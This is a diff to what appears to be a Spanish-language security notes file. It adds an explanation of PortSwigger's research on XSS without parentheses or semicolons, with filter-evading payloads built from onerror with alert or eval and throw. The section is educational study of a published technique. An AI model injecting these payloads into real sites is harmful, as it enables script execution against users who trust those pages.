@@ -122,6 +122,91 @@ Como `onerror` apunta a `alert`, el navegador termina ejecutando `alert(1)`. El 
 
 `Nota`: [Investigación de PortSwigger sobre XSS sin paréntesis ni punto y coma](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)
 
+# XSS sin Paréntesis y Puntos y Coma - Explicación Detallada
+
+El artículo de PortSwigger titulado ["XSS without parentheses and semi-colons"](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)
+explora técnicas avanzadas para ejecutar funciones en JavaScript sin utilizar paréntesis ni puntos y coma, lo cual es útil para evadir filtros de seguridad
+que bloquean estos caracteres en ataques de Cross-Site Scripting (XSS).
+
+## Introducción
+
+Tradicionalmente, para invocar una función en JavaScript, se emplean paréntesis para pasar argumentos, como en:
+
+```js
+alert(1337);
+```
+
+Sin embargo, algunos sistemas implementan filtros que bloquean los paréntesis y puntos y coma para prevenir ataques XSS.
+
+El investigador Gareth Heyes descubrió una técnica que utiliza el manejador de eventos `onerror` y la instrucción `throw` para llamar funciones
+sin necesidad de paréntesis ni puntos y coma.
+
+## ¿Cómo funciona?
+
+- `onerror` se activa cada vez que ocurre una excepción en JavaScript.
+- `throw` permite lanzar excepciones personalizadas.
+
+Al asignar una función al `onerror` y luego lanzar una excepción con `throw`, se puede invocar la función asignada pasando el valor de la excepción
+como argumento.
+
+### Ejemplo básico
+
+```html
+<script>
+  onerror = alert;
+  throw 1337;
+</script>
+```
+
+- Se asigna la función `alert` al manejador `onerror`.
+- Luego, se lanza una excepción con `throw 1337;`.
+- El manejador `onerror` captura la excepción y ejecuta `alert(1337)`.
+
+## Evasión de Filtros
+
+### Sin punto y coma
+
+Puedes usar bloques de código con llaves `{}` para evitar el uso de `;`:
+
+```html
+<script>
+  {onerror = alert}
+  throw 1337;
+</script>
+```
+
+### Todo en una línea
+
+También se puede combinar `onerror` y `throw` en una sola línea:
+
+```html
+<script>
+  throw onerror = alert, 'mensaje';
+</script>
+```
+
+Aquí, se asigna `alert` a `onerror` y luego se lanza una excepción con `'mensaje'` como argumento.
+
+## Manipulación de Excepciones con eval
+
+Algunos navegadores anteponen un prefijo como `"Uncaught"` al mensaje de excepción. Para manipular eso:
+
+```html
+<script>
+  {onerror = eval}
+  throw '=alert(1337)';
+</script>
+```
+
+- `eval` es asignado a `onerror`.
+- Se lanza una excepción con un string que comienza con `=`, lo cual convierte el mensaje de error resultante en un código ejecutable.
+- `eval` ejecuta `alert(1337);`.
+
+## Conclusión
+
+Estas técnicas demuestran cómo es posible evadir filtros de seguridad que bloquean paréntesis y puntos y coma,
+aprovechando características del lenguaje JavaScript y comportamientos específicos de los navegadores para ejecutar código malicioso en ataques XSS.
+
 
 ---
 
